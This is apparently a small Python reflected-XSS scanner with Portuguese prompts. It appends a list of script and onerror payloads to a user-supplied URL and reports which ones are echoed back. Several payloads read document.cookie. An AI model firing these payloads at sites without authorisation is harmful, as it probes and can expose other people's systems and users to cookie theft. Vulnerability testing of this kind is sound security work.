import time
import requests
from utils import save_result

def test_xss():
    url = input("Digite a URL para teste de XSS: ")

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<script>document.write('<img src=x onerror=alert('XSS')>')</script>",
        "<script>prompt(document.cookie)</script>",
        "<script>confirm(document.cookie)</script>",
        "<script>console.log(document.cookie)</script>",
        "<script>console.log('XSS')</script>",
        "<script>console.warn('XSS')</script>",
        "<script>console.error('XSS')</script>",
        "<script>console.info('XSS')</script>",
        "<script>console.debug('XSS')</script>",
        "<script>console.trace('XSS')</script>",
        "<script>console.dir('XSS')</script>",
        "<script>console.dirxml('XSS')</script>",
        "<script>console.group('XSS')</script>",
        "<script>console.groupEnd('XSS')</script>",
        "<script>console.table('XSS')</script>",
        "<script>console.count('XSS')</script>"
    ]

    results = []

    start_time = time.time()
    for payload in xss_payloads:
        try:
            response = requests.get(url + payload, timeout=5)
            if payload in response.text:
                results.append({"payload": payload, "vulnerable": True})
                print(f"Vulnerabilidade XSS encontrada com payload: {payload}")
            else:
                results.append({"payload": payload, "vulnerable": False})
        except requests.exceptions.RequestException as e:
            print(f"Erro ao testar payload '{payload}': {e}")
    end_time = time.time()
    
    print(f"Tempo de execução: {(end_time - start_time):.2f} segundos.")
          
    save = input("Deseja salvar os resultados? (s/n): ")
    if save.lower() == 's':
        sanitized_url = url.replace('http://', '').replace('https://', '').replace('/', '_')
        save_result(results, "xss_results", f"xss_test_{sanitized_url}.json")
        print("Resultados salvos.")

